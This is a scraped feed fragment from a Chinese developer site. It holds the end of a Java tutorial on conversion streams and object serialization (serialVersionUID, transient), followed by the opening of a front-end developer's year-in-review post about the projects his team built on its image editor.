.task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h4 data-id="heading-0">转换流</h4>
<p>转换流属于字符流，它也是一种高级流，用来包装基本流。其中转换输入流为<code>InputStreamReader</code>，转换输出流为<code>OutputStreamWriter</code>，为什么这么命名呢？</p>
<p>转换流是字符流与字节流的桥梁。我们以读取数据为例。读取数据，先需要一个数据源，然后将数据源中的数据读取到内存中。在创建转换输入流对象时，要包装一个字节输入流。包装完后，这个字节流获得了字符流的特性，例如读取数据不会乱码了、可以根据字符集一次读取多个字节。这也是其名字由来。前面的<code>InputStream</code>表示它能将字节流转换为字符流，后面的Reader表示它是字符流的语言，继承了Reader</p>
<p>写数据同理，只不过转换输出流将字符流转换为字节流。因为在数据的目的地，也就是文件中，它真实的存储形式就是一个又一个的字节。</p>
<p>因此，如果我们在字节流中想要用字符流的方法，或者想要指定字符集读写数据（JDK11后已淘汰），就可以使用转换流。</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">iodemo</span> {
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IOException {
        <span class="hljs-comment">//1.创建对象并按照指定字符编码</span>
        <span class="hljs-type">InputStreamReader</span> <span class="hljs-variable">isr</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InputStreamReader</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(<span class="hljs-string">"io/gbkfile.txt"</span>),<span class="hljs-string">"GBK"</span>);
        
        <span class="hljs-comment">//2.读取数据</span>
        <span class="hljs-type">int</span> ch;
        <span class="hljs-keyword">while</span>((ch = isr.read()) != -<span class="hljs-number">1</span>) {
            System.out.println((<span class="hljs-type">char</span>)ch);
        }
        
        <span class="hljs-comment">//3.关闭流</span>
        isr.close();
    }
}
</code></pre>
<p>JDK11以后的替代方案如下：</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">iodemo</span> {
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IOException {
        
        <span class="hljs-comment">//1.创建对象并按照指定字符编码</span>
        <span class="hljs-type">FileReader</span> <span class="hljs-variable">fr</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileReader</span>(<span class="hljs-string">"io/gbkfile.txt"</span>, Charset.forName(<span class="hljs-string">"GBK"</span>));
​
        <span class="hljs-comment">//2.读取数据</span>
        <span class="hljs-type">int</span> ch;
        <span class="hljs-keyword">while</span>((ch = fr.read()) != -<span class="hljs-number">1</span>) {
            System.out.println((<span class="hljs-type">char</span>)ch);
        }
​
        <span class="hljs-comment">//3.关闭流</span>
        fr.close();
    }
}
</code></pre>
<p>写出数据类似</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">iodemo</span> {
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IOException {
        <span class="hljs-type">OutputStreamWriter</span> <span class="hljs-variable">osw</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">OutputStreamWriter</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">"io/a.txt"</span>), <span class="hljs-string">"GBK"</span>);
        osw.write(<span class="hljs-string">"你好，哥们"</span>);
        osw.close();
    }
}
</code></pre>
<p>直接在IDEA里面打开<code>a.txt</code>会是乱码，因为IDEA默认是UTF-8，我们可以在本地打开。</p>
<p>JDK11后的替代方案：</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">iodemo</span> {
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IOException {
        <span class="hljs-type">FileWriter</span> <span class="hljs-variable">fw</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileWriter</span>(<span class="hljs-string">"io/gbkfile.txt"</span>, Charset.forName(<span class="hljs-string">"GBK"</span>));
        fw.write(<span class="hljs-string">"你好，哥们"</span>);
        fw.close();
    }
}
</code></pre>
<p>需求：将本地文件的GBK文件，转成UTF-8</p>
<p>JDK11以前的方案：</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">iodemo</span> {
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IOException {
        <span class="hljs-type">InputStreamReader</span> <span class="hljs-variable">isr</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InputStreamReader</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(<span class="hljs-string">"io/a.txt"</span>), Charset.forName(<span class="hljs-string">"GBK"</span>));
        <span class="hljs-type">OutputStreamWriter</span> <span class="hljs-variable">osw</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">OutputStreamWriter</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">"io/b.txt"</span>), Charset.forName(<span class="hljs-string">"UTF-8"</span>));
        <span class="hljs-type">int</span> ch;
        <span class="hljs-keyword">while</span>((ch = isr.read()) != -<span class="hljs-number">1</span>) {
            osw.write(ch);
        }
        osw.close();
        isr.close();
    }
}
</code></pre>
<p>JDK11后的替代方案：</p>
<pre><code class="hljs language-ini" lang="ini">public class iodemo {
    public static void main(String<span class="hljs-section">[]</span> args) throws IOException {
        FileReader <span class="hljs-attr">fr</span> = new FileReader(<span class="hljs-string">"io/a.txt"</span>, Charset.forName(<span class="hljs-string">"GBK"</span>))<span class="hljs-comment">;</span>
        FileWriter <span class="hljs-attr">fw</span> = new FileWriter(<span class="hljs-string">"io/b.txt"</span>, Charset.forName(<span class="hljs-string">"UTF-8"</span>))<span class="hljs-comment">;</span>
        int ch<span class="hljs-comment">;</span>
        while((<span class="hljs-attr">ch</span> = fr.read()) != -<span class="hljs-number">1</span>) {
            fw.write(ch)<span class="hljs-comment">;</span>
        }
        fw.close()<span class="hljs-comment">;</span>
        fr.close()<span class="hljs-comment">;</span>
    }
}
</code></pre>
<p>练习：利用字节流读取文件中的数据，每次读一整行，且不能出现乱码。</p>
<p>由于字节流在读中文的时候会出现乱码，并且字节流中没有读一整行的方法，因此要考虑先将字节流转换为字符流，再将字符流包装成字符缓冲流。</p>
<pre><code class="hljs language-ini" lang="ini">public class iodemo {
    public static void main(String<span class="hljs-section">[]</span> args) throws IOException {
        FileInputStream <span class="hljs-attr">fis</span> = new FileInputStream(<span class="hljs-string">"io/a.txt"</span>)<span class="hljs-comment">;</span>
        InputStreamReader <span class="hljs-attr">isr</span> = new InputStreamReader(fis)<span class="hljs-comment">;</span>
        BufferedReader <span class="hljs-attr">br</span> = new BufferedReader(isr)<span class="hljs-comment">;</span>
​
        String line<span class="hljs-comment">;</span>
        while((<span class="hljs-attr">line</span> = br.readLine()) != null) {
            System.out.println(line)<span class="hljs-comment">;</span>
        }
        br.close()<span class="hljs-comment">;</span>
        isr.close()<span class="hljs-comment">;</span>
        fis.close()<span class="hljs-comment">;</span>
    }
}
</code></pre>
<p>当然也可以简化一下：</p>
<pre><code class="hljs language-arduino" lang="arduino"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">iodemo</span> {
    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-type">String</span>[] args)</span> throws IOException </span>{
        BufferedReader br = <span class="hljs-keyword">new</span> <span class="hljs-built_in">BufferedReader</span>(<span class="hljs-keyword">new</span> <span class="hljs-built_in">InputStreamReader</span>(<span class="hljs-keyword">new</span> <span class="hljs-built_in">FileInputStream</span>(<span class="hljs-string">"io/a.txt"</span>)));
​
        <span class="hljs-type">String</span> line;
        <span class="hljs-keyword">while</span>((line = br.<span class="hljs-built_in">readLine</span>()) != null) {
            System.out.<span class="hljs-built_in">println</span>(line);
        }
        br.<span class="hljs-built_in">close</span>();
    }
}
</code></pre>
<h4 data-id="heading-1">序列化流</h4>
<p>序列化流与反序列化流都属于字节流。序列化流（<code>ObjectOutputStream</code>）负责输出数据，反序列化流（<code>ObjectInputStream</code>）负责写入数据。</p>
<p>序列化流（又名对象操作输出流）可以将Java中的对象写到本地文件中。</p>













<table><thead><tr><th>构造方法</th><th>说明</th></tr></thead><tbody><tr><td>public ObjectOutputStream(OutputStream out)</td><td>把基本流包装成高级流</td></tr></tbody></table>













<table><thead><tr><th>成员方法</th><th>说明</th></tr></thead><tbody><tr><td>public final void writeObject(Object obj)</td><td>把对象序列化到文件中</td></tr></tbody></table>
<p>我们创建一个Student类作为演示。</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">iodemo</span> {
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IOException {
        <span class="hljs-comment">//1.创建学生对象</span>
        <span class="hljs-type">Student</span> <span class="hljs-variable">stu</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Student</span>(<span class="hljs-string">"张三"</span>,<span class="hljs-number">18</span>);
​
        <span class="hljs-comment">//2.创建序列化流对象</span>
        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">"io\a.txt"</span>));
​
        <span class="hljs-comment">//3.写出数据</span>
        oos.writeObject(stu);
​
        <span class="hljs-comment">//4.释放资源</span>
        oos.close();
    }
}
</code></pre>
<p>运行后，发现报了一个<code>NotSerializableException</code>的异常。这是序列化流的细节：使用序列化流将对象保存到文件时，会出现<code>NotSerializableException</code>异常。解决方法是：让JavaBean类实现Serializable接口。</p>
<p>我们发现Serializable接口中没有抽象方法，因此我们在Student类中也不需要实现。这种没有抽象方法的接口被称作标记接口。在这里，实现Serializable接口相当于标记Student类是可以被序列化的。相当于一个物品的合格证。</p>
<pre><code class="hljs language-arduino" lang="arduino"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Student</span> implements Serializable {
    <span class="hljs-keyword">private</span> <span class="hljs-type">String</span> name;
    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> age;
​
    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">Student</span><span class="hljs-params">(<span class="hljs-type">String</span> name, <span class="hljs-type">int</span> age)</span> </span>{
        <span class="hljs-keyword">this</span>.name = name;
        <span class="hljs-keyword">this</span>.age = age;
    }
​
    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-type">String</span> <span class="hljs-title">getName</span><span class="hljs-params">()</span> </span>{
        <span class="hljs-keyword">return</span> name;
    }
​
    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-type">void</span> <span class="hljs-title">setName</span><span class="hljs-params">(<span class="hljs-type">String</span> name)</span> </span>{
        <span class="hljs-keyword">this</span>.name = name;
    }
​
    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title">getAge</span><span class="hljs-params">()</span> </span>{
        <span class="hljs-keyword">return</span> age;
    }
​
    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-type">void</span> <span class="hljs-title">setAge</span><span class="hljs-params">(<span class="hljs-type">int</span> age)</span> </span>{
        <span class="hljs-keyword">this</span>.age = age;
    }
}
</code></pre>
<h4 data-id="heading-2">反序列化流</h4>
<p>反序列化流（又名对象操作输入流）可以把序列化到本地文件中的对象读取到程序中。</p>













<table><thead><tr><th>构造方法</th><th>说明</th></tr></thead><tbody><tr><td>public ObjectInputStream(InputStream in)</td><td>把基本流变成包装流</td></tr></tbody></table>













<table><thead><tr><th>成员方法</th><th>说明</th></tr></thead><tbody><tr><td>public Object readObject()</td><td>把序列化到本地文件中的对象读取到程序中</td></tr></tbody></table>
<p>注意这个方法的返回值是<code>Object</code>类型的，如果要使用，需要做一次强转。</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">iodemo</span> {
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException {
        <span class="hljs-comment">//1.创建反序列化流对象</span>
        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(<span class="hljs-string">"io\a.txt"</span>));
​
        <span class="hljs-comment">//2.读取数据</span>
        <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> ois.readObject();
​
        <span class="hljs-comment">//3.打印对象</span>
        System.out.println(o);
​
        <span class="hljs-comment">//4.释放资源</span>
        ois.close();
​
    }
}
</code></pre>
<p>可以看到，输出的是地址值。这是因为JavaBean类没有重写<code>toString</code>方法。重写之后再运行一次，发现又报错了，报错信息：</p>
<p>local class incompatible: stream classdesc serialVersionUID = -6802632944716881899, local class serialVersionUID = -175568608660738196</p>
<p>这是因为我们重写<code>toString</code>方法，是对Student类的修改。而<code>serialVersionUID</code>是Java序列化的类版本标识。JVM靠它判断反序列化的字节流是否和当前类匹配。当Student类实现Serializable接口时，JVM会根据它的成员变量、静态变量、构造方法、成员方法等内容自动生成一个long类型的<code>serialVersionUID</code>，可以理解为版本号。序列化时也会把这个版本号写到文件中。后续但凡对序列化后的类进行了一点修改，JVM也会重新为它生成一个<code>serialVersionUID</code>，反序列化时发现两个不一致，就报错了。</p>
<p>解决方法：</p>
<p>第一步：手动定义版本号。首先private是必须的，因为我们不希望版本号变更，所以在private的同时也不会为它提供get和set方法。static表示共享，表示这个类所有的对象都共享这个版本号。final表示最终，即版本号不会再发生变化。long是数据类型。并且只能命名为<code>serialVersionUID</code>，否则JVM不认它。</p>
<pre><code class="hljs language-arduino" lang="arduino"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Student</span> implements Serializable {
    <span class="hljs-keyword">private</span> <span class="hljs-type">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">long</span> serialVersionUID = <span class="hljs-number">1L</span>;
    
    <span class="hljs-keyword">private</span> <span class="hljs-type">String</span> name;
    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> age;
​
    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">Student</span><span class="hljs-params">(<span class="hljs-type">String</span> name, <span class="hljs-type">int</span> age)</span> </span>{
        <span class="hljs-keyword">this</span>.name = name;
        <span class="hljs-keyword">this</span>.age = age;
    }
​
    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-type">String</span> <span class="hljs-title">getName</span><span class="hljs-params">()</span> </span>{
        <span class="hljs-keyword">return</span> name;
    }
​
    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-type">void</span> <span class="hljs-title">setName</span><span class="hljs-params">(<span class="hljs-type">String</span> name)</span> </span>{
        <span class="hljs-keyword">this</span>.name = name;
    }
​
    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title">getAge</span><span class="hljs-params">()</span> </span>{
        <span class="hljs-keyword">return</span> age;
    }
​
    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-type">void</span> <span class="hljs-title">setAge</span><span class="hljs-params">(<span class="hljs-type">int</span> age)</span> </span>{
        <span class="hljs-keyword">this</span>.age = age;
    }
​
    @<span class="hljs-function">Override
    <span class="hljs-keyword">public</span> <span class="hljs-type">String</span> <span class="hljs-title">toString</span><span class="hljs-params">()</span> </span>{
        <span class="hljs-keyword">return</span> <span class="hljs-string">"Student{"</span> +
                <span class="hljs-string">"name='"</span> + name + <span class="hljs-string">'''</span> +
                <span class="hljs-string">", age="</span> + age +
                <span class="hljs-string">'}'</span>;
    }
}
</code></pre>
<p>便捷方法：点击文件 -&gt; 设置 -&gt; 输入Serializable -&gt; 勾选 不带 <code>serialVersionUID</code>的可序列化类 -&gt; 勾选 transient字段在反序列化时未被初始化</p>
<p>然后我们删掉定义版本号那一行，就会发现在Student类名字处有警告：Student未定义<code>serialVersionUID</code>字段。选中Student，Alt+回车，就可以选择添加该字段了。</p>
<p>然后我们重新将对象序列化到本地文件，再反序列化即可看到正常输出。固定版本号的好处在于，序列化之后你可以对类做任何修改，都不会因此导致反序列化出现版本号不匹配的问题。</p>
<p>但需要注意的是，不要一上来就生成版本号，因为这个版本号是根据类的内容计算出来的。</p>
<p>如果我们不想把一些变量序列化到本地文件，我们可以为它加上transient关键字（瞬态关键字），它的作用就是不会把当前属性序列化到本地文件中。</p>
<pre><code class="hljs language-arduino" lang="arduino"><span class="hljs-keyword">private</span> transient <span class="hljs-type">String</span> address;
</code></pre>
<p>如果序列化了多个对象，由于个数不确定，该如何进行反序列化？</p>
<p>反序列化的时候，如果读不到了，就会报错：<code>EOFException</code></p>
<p>解决方法是：在序列化时，先把对象放进一个<code>ArrayList</code>中，再直接序列化这个<code>ArrayList</code>. <code>ArrayList</code>实现了Serializable接口，也有自己的版本号。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[前端真有意思，又干了一年图片编辑器]]></title>    <link>https://juejin.cn/post/7591681023908151305</link>    <guid>https://juejin.cn/post/7591681023908151305</guid>    <pubDate>2026-01-05T09:46:29.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7591681023908151305" data-draft-id="7591635567587557422" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="前端真有意思，又干了一年图片编辑器"/> <meta itemprop="keywords" content="前端,JavaScript,产品"/> <meta itemprop="datePublished" content="2026-01-05T09:46:29.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="愚坤秦少卫"/> <meta itemprop="url" content="https://juejin.cn/user/3843548383549214"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            前端真有意思，又干了一年图片编辑器
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3843548383549214/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    愚坤秦少卫
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-05T09:46:29.000Z" title="Mon Jan 05 2026 09:46:29 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-05
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读4分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>大家好，我是一名前端工程师，也是开源图片编辑器<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fikuaitu%2Fvue-fabric-editor" target="_blank" title="https://github.com/ikuaitu/vue-fabric-editor" ref="nofollow noopener noreferrer">vue-fabric-editor</a>项目的作者，<strong>我是一名干了十几年的前端程序员，真的越干越觉得前端开发有意思</strong>。</p>
<p>图片编辑器截图：
<img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/2522cbae98b847cfb8c6546bcfa72f64~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5oSa5Z2k56em5bCR5Y2r:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768211188&amp;x-signature=fpz4Cpoyvk%2BxQggH46oQxihvrtU%3D" alt="Foxmail20260105052725.png" loading="lazy"/></p>
<p>从2025年孤军奋战到拉起几个人的小团队，现在已经2026年了，不知不觉一年就过去了，<strong>前端的创业小团队都能做出哪些有意思的项目</strong>，大家一起看看我们做的项目，也算是我们团队的年终总结了。</p>
<p><strong>项目列表：</strong></p>
<ol>
<li>POD样机</li>
<li>丝巾设计平台</li>
<li>吧唧设计/亚克力设计</li>
<li>盒型/刀版设计</li>
<li>印花设计</li>
<li>工艺仿真</li>
</ol>
<h2 data-id="heading-0">POD样机</h2>
<p>这是一个快速生成电商图片的场景，让用户上传一张图片，<strong>快速生成多个不同场景的图片</strong>，比如冰袖产品，只需要穿一张印花图片，就可以生成多个不同场景和不同穿戴角度的电商图片，可以用来快速上架到电商平台。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/732637b4e20f449281ffdf95c76cb172~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5oSa5Z2k56em5bCR5Y2r:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768211188&amp;x-signature=Q0MBv0XoqC0Ic%2BAVghk4YKOX1Gc%3D" alt="" loading="lazy"/></p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/bb7eda2c574946058381c94cacb3f50e~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5oSa5Z2k56em5bCR5Y2r:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768211188&amp;x-signature=s6qXsnf2Q6lzlls%2FKiumiEMsfqQ%3D" alt="2.gif" loading="lazy"/></p>
<p>不仅仅是冰袖，<strong>还是支持更复杂的服装设计</strong>，同时生成工厂打印使用的刀版图，一次生成不同尺码。</p>
